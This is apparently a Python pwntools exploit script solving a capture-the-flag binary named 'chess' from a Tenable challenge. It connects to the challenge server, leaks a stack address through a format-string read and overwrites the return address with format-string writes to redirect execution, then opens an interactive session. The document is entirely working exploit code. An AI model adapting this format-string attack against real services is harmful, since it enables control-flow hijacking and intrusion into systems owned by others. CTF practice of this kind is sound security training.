from pwn import *
import sys, os

LOCAL = False
HOST, PORT = 'challenges.ctfd.io', 30458
FILE = '/home/ubuntu/tenable/queens_gambit/chess'

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if LOCAL:
	r = process(FILE)
else:
	r = remote(HOST, PORT)

if LOCAL and 'gdb' in sys.argv:
	gdb.attach(r, 'break *0x401AA1')

r.sendlineafter('\n', '1')
r.sendlineafter('\n', 'my name')

payload = b'CCCCCCCC%5$p'
log.info(payload)
r.sendlineafter('\n\n', b'Ra1 ' + payload)

r.recvuntil('Ra1 CCCCCCCC')
stack = int(r.recvline()[:-1], 16)
ret_at = stack + 0xa8
fmt_ret_at = stack - 0x38
log.info(f'stack = {hex(stack)}')
log.info(f'ret_at = {hex(ret_at)}')
log.info(f'fmt_ret_at = {hex(fmt_ret_at)}')

# need to write 0x4011C2 to return
# but 0xC3 instead of 0xC2 to fix stack
payload = fmtstr_payload(22, {ret_at: 0xC3}, write_size='short', numbwritten=80)
r.sendlineafter('\n\n', b'Qg7 ' + payload)
payload = fmtstr_payload(23, {ret_at + 1: 0x4011}, write_size='short', numbwritten=88)
r.sendlineafter('\n\n', b'Kd2 ' + b'AAA' + payload)

r.interactive()
